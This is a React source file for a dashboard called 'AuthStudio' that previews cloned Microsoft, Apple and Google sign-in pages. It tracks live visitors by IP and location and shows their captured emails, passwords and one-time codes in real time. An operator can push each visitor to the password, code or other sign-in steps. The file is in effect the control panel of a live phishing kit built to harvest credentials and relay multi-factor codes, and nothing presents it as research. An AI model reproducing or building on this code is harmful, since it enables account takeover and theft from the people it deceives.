import { useState, useEffect, useRef } from 'react';
import { Monitor, Smartphone, Tablet, Moon, Sun, Key, Lock, Mail, LayoutList, Eye, X, Database, Trash2, Loader2 } from 'lucide-react';

const MicrosoftLogo = () => (
  <svg width="16" height="16" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
    <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
    <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
    <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
    <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
  </svg>
);
const MicrosoftLogoLg = () => (
  <svg width="20" height="20" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
    <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
    <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
    <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
    <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
  </svg>
);

const AppleLogo = ({ className, style }: { className?: string; style?: React.CSSProperties }) => (
  <svg className={className} style={style} viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg">
    <path fill="currentColor" d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/>
  </svg>
);

const GoogleLogo = ({ size = 20 }: { size?: number }) => (
  <svg width={size} height={size} viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
  </svg>
);

type Provider = 'microsoft' | 'apple' | 'google';
type Device = 'desktop' | 'tablet' | 'mobile';
type Theme = 'light' | 'dark';
type Prompt = 'password' | 'email-code' | 'other-ways';

interface VisitorLocation {
  city: string;
  country: string;
  countryCode: string;
  flag: string;
}

interface VisitorInfo {
  id: string;
  ip: string;
  location: VisitorLocation;
  provider: string;
  step: string;
  userAgent: string;
  connectedAt: number;
  formData: Record<string, string>;
  online: boolean;
}

const PROVIDER_COLORS: Record<Provider, string> = {
  microsoft: '#0078D4',
  apple: '#007AFF',
  google: '#4285F4',
};

const STEP_LABELS: Record<string, string> = {
  email: 'Email',
  password: 'Password',
  'email-code': 'Code',
  'email-code-input': 'Enter Code',
  'other-ways': 'Other Ways',
  'phone-entry': 'Phone',
  'phone-code': 'Phone Code',
  'signin-options': 'Sign-in Opts',
  passkey: 'Passkey',
  stay: 'Stay Signed In',
  register: 'Register',
  recover: 'Recover',
};

const STEP_COLORS: Record<string, string> = {
  email: '#4b5563',
  password: '#0078D4',
  'email-code': '#7c3aed',
  'email-code-input': '#7c3aed',
  'other-ways': '#047857',
  'phone-entry': '#b45309',
  'phone-code': '#b45309',
  stay: '#15803d',
  register: '#be185d',
  recover: '#9f1239',
};

const FIELD_LABELS: Record<string, string> = {
  email: 'Email / Phone',
  password: 'Password',
  email_code: 'Email Code',
  phone: 'Phone Number',
  phone_code: 'Phone Code',
};

function ProviderBadge({ provider, size = 14 }: { provider: string; size?: number }) {
  if (provider === 'microsoft') return <MicrosoftLogo />;
  if (provider === 'apple') return <AppleLogo className={`text-black`} style={{ width: size, height: size } as React.CSSProperties} />;
  if (provider === 'google') return <GoogleLogo size={size} />;
  return <span className="text-[11px] text-[#aaa]">{provider}</span>;
}

function loginSrc(provider: Provider, device: Device, theme: Theme, prompt: Prompt, phoneEnabled: boolean) {
  const base = import.meta.env.BASE_URL.replace(/\/$/, '');
  const phonePart = provider === 'microsoft' && phoneEnabled ? '&phone=1' : '';
  return `${base}/?provider=${provider}&device=${device}&theme=${theme}&prompt=${prompt}${phonePart}`;
}

function visitorModalSrc(visitor: VisitorInfo) {
  const base = import.meta.env.BASE_URL.replace(/\/$/, '');
  return `${base}/?provider=${visitor.provider}&device=desktop&theme=light&prompt=password&viewOnly=1&targetId=${visitor.id}&initialStep=${visitor.step}`;
}

function Toggle({ enabled, onToggle }: { enabled: boolean; onToggle: () => void }) {
  return (
    <button
      onClick={onToggle}
      className={`relative w-9 h-5 rounded-full transition-colors flex-shrink-0 focus:outline-none ${enabled ? 'bg-[#0078D4]' : 'bg-[#3a3f4a]'}`}
      aria-pressed={enabled}
    >
      <span className={`absolute top-0.5 w-4 h-4 rounded-full bg-white shadow transition-transform ${enabled ? 'translate-x-4' : 'translate-x-0.5'}`} />
    </button>
  );
}

function ActionBtn({ label, color, onClick, fullWidth }: { label: string; color: string; onClick: () => void; fullWidth?: boolean }) {
  return (
    <button
      onClick={onClick}
      className={`px-2 py-1 rounded text-[11px] font-semibold text-white transition-opacity hover:opacity-80 flex-shrink-0 ${fullWidth ? 'w-full' : ''}`}
      style={{ backgroundColor: color }}
    >
      {label}
    </button>
  );
}

// ── Visitor live-view modal ────────────────────────────────────────────────────

function VisitorModal({
  visitor,
  onClose,
  onPushAction,
  onDeleteField,
  onDeleteAll,
}: {
  visitor: VisitorInfo;
  onClose: () => void;
  onPushAction: (visitorId: string, navigate: string) => void;
  onDeleteField: (visitorId: string, field: string) => void;
  onDeleteAll: (visitorId: string) => void;
}) {
  const [iframeLoaded, setIframeLoaded] = useState(false);
  const iframeSrc = visitorModalSrc(visitor);
  const stepColor = STEP_COLORS[visitor.step] ?? '#4b5563';
  const stepLabel = STEP_LABELS[visitor.step] ?? visitor.step;
  const formEntries = Object.entries(visitor.formData ?? {});
  const isSensitive = (field: string) => field === 'password' || field === 'email_code' || field === 'phone_code';
  const [revealField, setRevealField] = useState<string | null>(null);

  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center p-4"
      style={{ backgroundColor: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(6px)' }}
    >
      <div className="relative w-full h-full max-w-[1200px] max-h-[820px] flex flex-col bg-[#13151a] rounded-2xl overflow-hidden border border-[#2d3139] shadow-2xl">

        {/* Header */}
        <div className="flex items-center justify-between px-5 py-3 border-b border-[#2d3139] bg-[#16181d] flex-shrink-0">
          <div className="flex items-center gap-3 min-w-0">
            <div className={`w-2 h-2 rounded-full flex-shrink-0 ${visitor.online ? 'bg-green-400 animate-pulse' : 'bg-[#555d6b]'}`} />
            <div className="w-6 h-6 rounded bg-white flex items-center justify-center flex-shrink-0 shadow-sm">
              <ProviderBadge provider={visitor.provider} />
            </div>
            <span className="text-white font-semibold text-[14px] flex-shrink-0">Live View</span>
            <span className="text-[10px] font-semibold px-2 py-0.5 rounded text-white flex-shrink-0" style={{ backgroundColor: stepColor }}>{stepLabel}</span>
            <span className="text-[12px] text-[#8a919e] truncate">{visitor.location.flag} {visitor.location.city}, {visitor.location.country}</span>
            <span className="text-[11px] font-mono text-[#555d6b] flex-shrink-0 hidden sm:block">{visitor.ip}</span>
          </div>
          <button
            onClick={onClose}
            className="w-8 h-8 flex items-center justify-center rounded-full bg-[#2d3139] hover:bg-[#3a3f4a] text-[#aeb5c0] hover:text-white transition-colors flex-shrink-0 ml-3"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Body */}
        <div className="flex flex-1 overflow-hidden">

          {/* Login iframe */}
          <div className="flex-1 bg-[#0b0c10] relative overflow-hidden">
            {!iframeLoaded && (
              <div className="absolute inset-0 flex flex-col items-center justify-center gap-4 z-10 bg-[#0b0c10]">
                <Loader2 className="w-8 h-8 text-[#3a3f4a] animate-spin" />
                <div className="text-center">
                  <p className="text-[14px] text-[#8a919e] font-medium">Loading live view…</p>
                  <p className="text-[11px] text-[#555d6b] mt-1">This may take a moment, hang tight</p>
                </div>
              </div>
            )}
            <iframe
              key={`modal-${visitor.id}`}
              src={iframeSrc}
              className="w-full h-full border-0"
              title="Visitor live view"
              onLoad={() => setIframeLoaded(true)}
            />
            {iframeLoaded && (
              <div className="absolute bottom-3 right-3 bg-black/60 rounded-lg px-2.5 py-1.5 text-[10px] text-[#8a919e] pointer-events-none backdrop-blur-sm">
                Synced via WebSocket — reflects visitor's step in real time
              </div>
            )}
          </div>

          {/* Right panel */}
          <div className="w-[272px] flex-shrink-0 flex flex-col border-l border-[#2d3139] overflow-y-auto bg-[#13151a]">

            {/* Push actions */}
            <div className="p-4 border-b border-[#2d3139]">
              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] mb-3">Push Action</p>
              <div className="grid grid-cols-2 gap-1.5">
                <ActionBtn fullWidth label="↩ Email"    color="#4b5563"  onClick={() => onPushAction(visitor.id, 'email')} />
                <ActionBtn fullWidth label="Password"   color="#0078D4"  onClick={() => onPushAction(visitor.id, 'password')} />
                <ActionBtn fullWidth label="Code"       color="#7c3aed"  onClick={() => onPushAction(visitor.id, 'email-code')} />
                <ActionBtn fullWidth label="Other ways" color="#047857"  onClick={() => onPushAction(visitor.id, 'other-ways')} />
              </div>
            </div>

            {/* Captured form data */}
            <div className="p-4 flex-1">
              <div className="flex items-center gap-2 mb-3">
                <Database className="w-3.5 h-3.5 text-[#8a919e]" />
                <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e]">Captured Data</p>
                {formEntries.length > 0 && (
                  <>
                    <span className="ml-auto text-[10px] font-semibold text-green-400">{formEntries.length} field{formEntries.length !== 1 ? 's' : ''}</span>
                    <button
                      onClick={() => { if (confirm('Clear all captured data for this visitor?')) onDeleteAll(visitor.id); }}
                      className="w-5 h-5 flex items-center justify-center rounded hover:bg-red-900/40 text-[#555d6b] hover:text-red-400 transition-colors"
                      title="Clear all data"
                    >
                      <Trash2 className="w-3 h-3" />
                    </button>
                  </>
                )}
              </div>

              {formEntries.length === 0 ? (
                <div className="rounded-xl border border-dashed border-[#2d3139] px-3 py-6 text-center">
                  <div className="w-8 h-8 rounded-full bg-[#1e2128] flex items-center justify-center mx-auto mb-2">
                    <Database className="w-4 h-4 text-[#3e4450]" />
                  </div>
                  <div className="text-[12px] text-[#555d6b]">No data yet</div>
                  <div className="text-[10px] text-[#3e4450] mt-1">Fields appear as the visitor submits each step</div>
                </div>
              ) : (
                <div className="space-y-2">
                  {formEntries.map(([field, value]) => {
                    const sensitive = isSensitive(field);
                    const revealed = revealField === field;
                    return (
                      <div key={field} className="bg-[#1a1d24] rounded-xl border border-[#2d3139] overflow-hidden group">
                        <div className="flex items-center justify-between px-3 pt-2 pb-0.5">
                          <span className="text-[9px] text-[#555d6b] uppercase font-bold tracking-widest">
                            {FIELD_LABELS[field] ?? field}
                          </span>
                          <div className="flex items-center gap-1">
                            {sensitive && (
                              <button
                                onClick={() => setRevealField(revealed ? null : field)}
                                className="text-[9px] font-semibold text-amber-500 hover:text-amber-300 transition-colors uppercase tracking-wide"
                              >
                                {revealed ? 'hide' : 'show'}
                              </button>
                            )}
                            <button
                              onClick={() => onDeleteField(visitor.id, field)}
                              className="w-4 h-4 flex items-center justify-center rounded hover:bg-red-900/40 text-[#3e4450] hover:text-red-400 transition-colors opacity-0 group-hover:opacity-100"
                              title={`Delete ${field}`}
                            >
                              <X className="w-2.5 h-2.5" />
                            </button>
                          </div>
                        </div>
                        <div className="px-3 pb-2.5 pt-0.5">
                          <span
                            className="text-[13px] font-mono break-all"
                            style={{ color: sensitive && !revealed ? '#6b7280' : sensitive ? '#f87171' : '#e2e8f0' }}
                          >
                            {sensitive && !revealed ? '•'.repeat(Math.min(value.length, 12)) : value}
                          </span>
                        </div>
                      </div>
                    );
                  })}

                  {/* Session info */}
                  <div className="mt-3 pt-3 border-t border-[#2d3139] space-y-1">
                    <p className="text-[9px] text-[#555d6b] uppercase font-bold tracking-widest mb-1.5">Session Info</p>
                    {[
                      ['Connected', new Date(visitor.connectedAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })],
                      ['Provider', visitor.provider],
                      ['IP', visitor.ip],
                      ['Status', visitor.online ? 'Online' : 'Offline — data persisted'],
                    ].map(([label, val]) => (
                      <div key={label} className="flex justify-between text-[11px]">
                        <span className="text-[#555d6b]">{label}</span>
                        <span className={`font-mono ${label === 'Status' && !visitor.online ? 'text-amber-500' : 'text-[#8a919e]'}`}>{val}</span>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

// ── Main AdminPage ─────────────────────────────────────────────────────────────

export default function AdminPage() {
  const [provider, setProvider] = useState<Provider>('microsoft');
  const [device, setDevice] = useState<Device>('desktop');
  const [theme, setTheme] = useState<Theme>('light');
  const [prompt, setPrompt] = useState<Prompt>('password');
  const [phoneEnabled, setPhoneEnabled] = useState(false);
  const [visitors, setVisitors] = useState<VisitorInfo[]>([]);
  const [modalVisitorId, setModalVisitorId] = useState<string | null>(null);
  const wsRef = useRef<WebSocket | null>(null);

  useEffect(() => {
    let ws: WebSocket | undefined;
    try {
      const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
      ws = new WebSocket(`${proto}//${window.location.host}/api/ws`);
      wsRef.current = ws;

      ws.onopen = () => {
        ws!.send(JSON.stringify({ type: 'register-admin' }));
      };

      ws.onmessage = (e: MessageEvent<string>) => {
        try {
          const msg = JSON.parse(e.data) as {
            type: string;
            visitors?: Array<VisitorInfo & { formData?: Record<string,string> }>;
            visitor?: VisitorInfo & { formData?: Record<string,string> };
            id?: string;
            step?: string;
            provider?: string;
            field?: string;
            value?: string;
          };

          if (msg.type === 'visitors' && msg.visitors) {
            setVisitors(msg.visitors.map(v => ({ ...v, formData: v.formData ?? {}, online: true })));
          } else if (msg.type === 'visitor-joined' && msg.visitor) {
            const v = { ...msg.visitor, formData: msg.visitor.formData ?? {}, online: true };
            // If visitor with same IP already exists (offline), replace it
            setVisitors(prev => {
              const idx = prev.findIndex(x => x.ip === v.ip && !x.online);
              if (idx >= 0) {
                const next = [...prev];
                next[idx] = { ...v, formData: { ...prev[idx].formData, ...v.formData } };
                return next;
              }
              return [...prev.filter(x => x.id !== v.id), v];
            });
          } else if (msg.type === 'visitor-left' && msg.id) {
            setVisitors(prev => prev.map(v => v.id === msg.id ? { ...v, online: false } : v));
          } else if (msg.type === 'visitor-updated' && msg.id) {
            setVisitors(prev => prev.map(v =>
              v.id === msg.id ? { ...v, step: msg.step ?? v.step, provider: msg.provider ?? v.provider } : v
            ));
          } else if (msg.type === 'visitor-form-data' && msg.id && msg.field) {
            setVisitors(prev => prev.map(v =>
              v.id === msg.id ? { ...v, formData: { ...v.formData, [msg.field!]: msg.value ?? '' } } : v
            ));
          } else if (msg.type === 'visitor-form-data-deleted' && msg.id) {
            setVisitors(prev => prev.map(v => {
              if (v.id !== msg.id) return v;
              if (msg.field === '*') return { ...v, formData: {} };
              const next = { ...v.formData };
              delete next[msg.field!];
              return { ...v, formData: next };
            }));
          }
        } catch { /* ignore */ }
      };
    } catch { /* ignore */ }

    return () => { try { ws?.close(); } catch { /* ignore */ } };
  }, []);

  const pushAction = (visitorId: string, navigate: string) => {
    const ws = wsRef.current;
    if (ws?.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'push-action', visitorId, action: { navigate } }));
    }
  };

  const deleteField = (visitorId: string, field: string) => {
    const ws = wsRef.current;
    if (ws?.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'delete-form-data', visitorId, field }));
    }
  };

  const deleteAll = (visitorId: string) => {
    const ws = wsRef.current;
    if (ws?.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: 'delete-form-data', visitorId, field: '*' }));
    }
  };

  const modalVisitor = visitors.find(v => v.id === modalVisitorId) ?? null;

  const providers: { id: Provider; name: string; icon: React.ReactNode }[] = [
    { id: 'microsoft', name: 'Microsoft', icon: <MicrosoftLogoLg /> },
    { id: 'apple',     name: 'Apple',     icon: <AppleLogo className="w-[18px] h-[18px]" /> },
    { id: 'google',    name: 'Google',    icon: <GoogleLogo /> },
  ];

  const devices: { id: Device; name: string; icon: React.ReactNode }[] = [
    { id: 'desktop', name: 'Desktop', icon: <Monitor className="w-4 h-4" /> },
    { id: 'tablet',  name: 'Tablet',  icon: <Tablet className="w-4 h-4" /> },
    { id: 'mobile',  name: 'Mobile',  icon: <Smartphone className="w-4 h-4" /> },
  ];

  const prompts: { id: Prompt; name: string; icon: React.ReactNode; desc: string }[] = [
    { id: 'password',   name: 'Password',   icon: <Lock className="w-3.5 h-3.5 text-white" />,       desc: 'Standard password entry' },
    { id: 'email-code', name: 'Email code', icon: <Mail className="w-3.5 h-3.5 text-white" />,       desc: 'Send code to email' },
    { id: 'other-ways', name: 'Other ways', icon: <LayoutList className="w-3.5 h-3.5 text-white" />, desc: 'Let user choose method' },
  ];

  const src = loginSrc(provider, device, theme, prompt, phoneEnabled);
  const accentColor = PROVIDER_COLORS[provider];

  const onlineCount = visitors.filter(v => v.online).length;
  const visitorsByProvider: Record<string, VisitorInfo[]> = {};
  for (const v of visitors) {
    (visitorsByProvider[v.provider] ??= []).push(v);
  }

  return (
    <div className="flex h-screen w-full overflow-hidden bg-[#0b0c10] text-[#ececf1] font-sans">

      {/* Modal */}
      {modalVisitor && (
        <VisitorModal
          visitor={modalVisitor}
          onClose={() => setModalVisitorId(null)}
          onPushAction={pushAction}
          onDeleteField={deleteField}
          onDeleteAll={deleteAll}
        />
      )}

      {/* Sidebar */}
      <aside className="w-[240px] flex-shrink-0 flex flex-col bg-[#16181d] border-r border-[#2d3139] shadow-xl z-10">
        <div className="h-14 flex items-center gap-3 px-5 border-b border-[#2d3139]/60 flex-shrink-0">
          <div className="w-6 h-6 rounded-md bg-gradient-to-br from-indigo-500 to-purple-600 flex items-center justify-center shadow">
            <Key className="w-3.5 h-3.5 text-white" />
          </div>
          <span className="text-[15px] font-semibold tracking-tight text-white">AuthStudio</span>
        </div>

        <div className="flex-1 overflow-y-auto p-4 space-y-6">

          {/* Provider */}
          <section className="space-y-2">
            <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Provider</p>
            <div className="space-y-1">
              {providers.map(p => {
                const count = (visitorsByProvider[p.id] ?? []).filter(v => v.online).length;
                return (
                  <button
                    key={p.id}
                    onClick={() => { setProvider(p.id); if (p.id !== 'microsoft') { setPrompt('password'); setPhoneEnabled(false); } }}
                    data-testid={`provider-btn-${p.id}`}
                    className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg transition-all text-left ${provider === p.id ? 'bg-[#23262f]' : 'hover:bg-[#1e2128]'}`}
                  >
                    <div className="w-7 h-7 rounded-md bg-white flex items-center justify-center flex-shrink-0 shadow-sm">
                      {p.icon}
                    </div>
                    <span className={`text-[14px] font-medium flex-1 ${provider === p.id ? 'text-white' : 'text-[#aeb5c0]'}`}>{p.name}</span>
                    {count > 0 && (
                      <span className="w-4 h-4 rounded-full bg-green-500 text-white text-[9px] font-bold flex items-center justify-center flex-shrink-0">{count}</span>
                    )}
                    {count === 0 && provider === p.id && (
                      <span className="w-1.5 h-1.5 rounded-full flex-shrink-0" style={{ backgroundColor: accentColor }} />
                    )}
                  </button>
                );
              })}
            </div>
          </section>

          {/* Device */}
          <section className="space-y-2">
            <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Device</p>
            <div className="flex bg-[#0f1115] p-1 rounded-lg border border-[#2d3139]">
              {devices.map(d => (
                <button
                  key={d.id}
                  onClick={() => setDevice(d.id)}
                  data-testid={`device-btn-${d.id}`}
                  className={`flex-1 flex flex-col items-center py-2 rounded-md transition-all gap-1 ${device === d.id ? 'bg-[#2d3139] text-white' : 'text-[#8a919e] hover:text-white hover:bg-[#1e2128]'}`}
                >
                  {d.icon}
                  <span className="text-[10px] font-medium">{d.name}</span>
                </button>
              ))}
            </div>
          </section>

          {/* Theme */}
          <section className="space-y-2">
            <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Theme</p>
            <div className="flex bg-[#0f1115] p-1 rounded-lg border border-[#2d3139]">
              <button onClick={() => setTheme('light')} data-testid="theme-btn-light"
                className={`flex-1 flex items-center justify-center gap-1.5 py-2 rounded-md transition-all text-[12px] font-semibold ${theme === 'light' ? 'bg-white text-black' : 'text-[#8a919e] hover:text-white'}`}>
                <Sun className="w-3.5 h-3.5" /> Light
              </button>
              <button onClick={() => setTheme('dark')} data-testid="theme-btn-dark"
                className={`flex-1 flex items-center justify-center gap-1.5 py-2 rounded-md transition-all text-[12px] font-semibold ${theme === 'dark' ? 'bg-[#2d3139] text-white' : 'text-[#8a919e] hover:text-white'}`}>
                <Moon className="w-3.5 h-3.5" /> Dark
              </button>
            </div>
          </section>

          {/* Prompt — Microsoft only */}
          {provider === 'microsoft' && (
            <section className="space-y-2">
              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Prompt</p>
              <div className="space-y-1">
                {prompts.map(p => (
                  <button key={p.id} onClick={() => setPrompt(p.id)}
                    className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg transition-all text-left ${prompt === p.id ? 'bg-[#23262f]' : 'hover:bg-[#1e2128]'}`}>
                    <div className={`w-7 h-7 rounded-md flex items-center justify-center flex-shrink-0 shadow-sm transition-colors ${prompt === p.id ? 'bg-[#0078D4]' : 'bg-[#2a2d35]'}`}>
                      {p.icon}
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className={`text-[13px] font-medium leading-none mb-0.5 ${prompt === p.id ? 'text-white' : 'text-[#aeb5c0]'}`}>{p.name}</div>
                      <div className="text-[11px] text-[#606672] truncate">{p.desc}</div>
                    </div>
                    {prompt === p.id && <span className="w-1.5 h-1.5 rounded-full flex-shrink-0 bg-[#0078D4]" />}
                  </button>
                ))}
              </div>
            </section>
          )}

          {/* Options — Microsoft only */}
          {provider === 'microsoft' && (
            <section className="space-y-2">
              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Options</p>
              <div className="rounded-lg border border-[#2d3139] bg-[#1a1d24]">
                <div className="flex items-center justify-between px-3 py-3">
                  <div className="flex items-center gap-2.5">
                    <Smartphone className="w-4 h-4 text-[#6b7280]" />
                    <div>
                      <div className="text-[13px] text-[#aeb5c0] font-medium leading-none mb-0.5">Phone SMS</div>
                      <div className="text-[10px] text-[#606672]">Show phone code option</div>
                    </div>
                  </div>
                  <Toggle enabled={phoneEnabled} onToggle={() => setPhoneEnabled(v => !v)} />
                </div>
              </div>
            </section>
          )}

          {/* Visitors */}
          <section className="space-y-2">
            <div className="flex items-center justify-between px-1">
              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e]">Visitors</p>
              {onlineCount > 0 && <span className="text-[10px] font-semibold text-green-400">{onlineCount} live</span>}
            </div>

            {visitors.length === 0 ? (
              <div className="rounded-lg border border-dashed border-[#2d3139] px-3 py-4 text-center">
                <div className="text-[11px] text-[#555d6b]">No visitors yet</div>
                <div className="text-[10px] text-[#3e4450] mt-0.5">Open the login page to track visitors</div>
              </div>
            ) : (
              <div className="space-y-2">
                {visitors.map(v => {
                  const stepColor = STEP_COLORS[v.step] ?? '#4b5563';
                  const stepLabel = STEP_LABELS[v.step] ?? v.step;
                  const hasData = Object.keys(v.formData ?? {}).length > 0;
                  return (
                    <div key={v.id} className={`rounded-lg border overflow-hidden transition-opacity ${v.online ? 'border-[#2d3139] bg-[#1a1d24]' : 'border-[#232630] bg-[#16181d] opacity-70'}`}>
                      {/* Header */}
                      <div className="flex items-center gap-2 px-2.5 pt-2.5 pb-1.5">
                        <div className={`w-1.5 h-1.5 rounded-full flex-shrink-0 ${v.online ? 'bg-green-400 animate-pulse' : 'bg-[#555d6b]'}`} />
                        <div className="w-5 h-5 rounded bg-white flex items-center justify-center flex-shrink-0 shadow-sm">
                          <ProviderBadge provider={v.provider} />
                        </div>
                        <span className="text-[10px] font-semibold px-1.5 py-0.5 rounded text-white leading-none flex-shrink-0" style={{ backgroundColor: stepColor }}>
                          {stepLabel}
                        </span>
                        {hasData && <span className="w-1.5 h-1.5 rounded-full bg-amber-400 flex-shrink-0" title="Has captured data" />}
                        <span className="text-[10px] text-[#555d6b] truncate ml-auto font-mono">
                          {new Date(v.connectedAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                        </span>
                      </div>

                      {/* Location */}
                      <div className="px-2.5 pb-1">
                        <div className="text-[11px] text-[#8a919e]">{v.location.flag} {v.location.city}, {v.location.country}</div>
                        <div className="text-[10px] text-[#555d6b] font-mono">{v.ip}</div>
                      </div>

                      {/* Actions */}
                      <div className="px-2.5 pb-2.5 pt-1 flex gap-1 flex-wrap items-center">
                        <ActionBtn label="↩ Email"    color="#4b5563" onClick={() => pushAction(v.id, 'email')} />
                        <ActionBtn label="Password"   color="#0078D4" onClick={() => pushAction(v.id, 'password')} />
                        <ActionBtn label="Code"       color="#7c3aed" onClick={() => pushAction(v.id, 'email-code')} />
                        <ActionBtn label="Other ways" color="#047857" onClick={() => pushAction(v.id, 'other-ways')} />
                        <button
                          onClick={() => setModalVisitorId(v.id)}
                          className="ml-auto flex items-center justify-center w-6 h-6 rounded bg-[#2d3139] hover:bg-[#3a3f4a] text-[#8a919e] hover:text-white transition-colors flex-shrink-0"
                          title="Live view"
                        >
                          <Eye className="w-3.5 h-3.5" />
                        </button>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </section>

        </div>

        <div className="h-10 flex items-center justify-center border-t border-[#2d3139]/50 text-[11px] text-[#555d6b] flex-shrink-0">
          AuthStudio v1.0
        </div>
      </aside>

      {/* Preview canvas */}
      <main className="flex-1 flex items-center justify-center relative overflow-hidden" style={{ backgroundColor: '#0b0c10' }}>
        <div className="absolute inset-0 pointer-events-none transition-all duration-1000"
          style={{ background: `radial-gradient(ellipse at center, ${accentColor}22 0%, transparent 65%)` }} />
        <div className="absolute inset-0 pointer-events-none opacity-30"
          style={{ backgroundImage: 'radial-gradient(circle, #ffffff18 1px, transparent 1px)', backgroundSize: '24px 24px' }} />

        <div className="relative z-10 flex items-center justify-center transition-all duration-300">
          {device === 'desktop' && (
            <div className="flex flex-col rounded-xl overflow-hidden shadow-2xl ring-1 ring-white/10"
              style={{ width: 980, height: 620, transform: 'scale(0.88)', transformOrigin: 'center center' }}>
              <div className="h-9 bg-[#2a2a2a] flex items-center px-4 flex-shrink-0 border-b border-black/30">
                <div className="flex gap-1.5 mr-4">
                  <div className="w-3 h-3 rounded-full bg-[#ff5f56]" />
                  <div className="w-3 h-3 rounded-full bg-[#ffbd2e]" />
                  <div className="w-3 h-3 rounded-full bg-[#27c93f]" />
                </div>
                <div className="flex-1 flex justify-center">
                  <div className="bg-[#1a1a1a] rounded text-[11px] text-[#888] font-mono px-3 py-0.5 w-[340px] text-center truncate">
                    https://signin.{provider}.com
                  </div>
                </div>
              </div>
              <iframe key={src} src={src} className="flex-1 border-0 bg-white" title="Login preview" />
            </div>
          )}

          {device === 'tablet' && (
            <div className="relative bg-black rounded-[2.5rem] p-4 shadow-2xl ring-4 ring-[#2a2a2a]"
              style={{ width: 600, height: 840, transform: 'scale(0.82)', transformOrigin: 'center center' }}>
              <div className="absolute top-1/2 -left-4 w-1.5 h-14 bg-[#2a2a2a] rounded-l-md -translate-y-1/2" />
              <div className="absolute top-1/2 -right-4 w-1.5 h-14 bg-[#2a2a2a] rounded-r-md -translate-y-1/2" />
              <div className="w-full h-full rounded-[2rem] overflow-hidden border border-white/10">
                <iframe key={src} src={src} className="w-full h-full border-0" title="Login preview" />
              </div>
            </div>
          )}

          {device === 'mobile' && (
            <div className="relative bg-black rounded-[3rem] p-3 shadow-2xl ring-[5px] ring-[#1a1a1a]"
              style={{ width: 340, height: 740, transform: 'scale(0.95)', transformOrigin: 'center center' }}>
              <div className="absolute top-24 -left-3.5 w-1.5 h-8 bg-[#1a1a1a] rounded-l-md" />
              <div className="absolute top-36 -left-3.5 w-1.5 h-14 bg-[#1a1a1a] rounded-l-md" />
              <div className="absolute top-52 -left-3.5 w-1.5 h-14 bg-[#1a1a1a] rounded-l-md" />
              <div className="absolute top-32 -right-3.5 w-1.5 h-20 bg-[#1a1a1a] rounded-r-md" />
              <div className="w-full h-full rounded-[2.3rem] overflow-hidden relative bg-white">
                <div className="absolute top-0 inset-x-0 flex justify-center z-20 pointer-events-none">
                  <div className="w-[100px] h-[22px] bg-black rounded-b-3xl" />
                </div>
                <iframe key={src} src={src} className="w-full h-full border-0" title="Login preview" />
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
